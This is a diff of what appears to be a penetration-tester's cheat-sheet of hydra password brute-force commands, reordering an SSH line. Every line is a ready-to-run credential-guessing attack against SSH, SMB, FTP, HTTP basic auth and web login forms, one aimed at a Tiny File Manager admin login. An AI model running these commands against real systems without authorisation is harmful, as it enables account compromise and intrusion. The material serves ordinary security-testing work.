@@ -1,4 +1,3 @@
-hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh
 hydra -L "$USERS" -P "$WORDLIST" "$TARGET" smb
 hydra -l "$USER" -P "$WORDLIST" "$TARGET" ftp
 hydra -l "$USER" -P "$WORDLIST" http-post-form "$URL:user=^USER^&pass=^PASS^:Invalid"
@@ -14,3 +13,4 @@ hydra -L users.txt -P `fzf-wordlists` http://"$TARGET" http-get
 hydra -l admin -P `fzf-wordlists` http://"$TARGET" http-post-form "/tiny/tinyfilemanager.php:fm_usr=admin&fm_pwd=^PASS^:Login failed"
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f "$IP" -s "$(fzf-port)" http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 hydra -l "$USER" -P passwords.txt -s "$(fzf-port)" -f "$TARGET" http-get /admin
+hydra -l "$USER" -P "$WORDLIST" "$TARGET" ssh
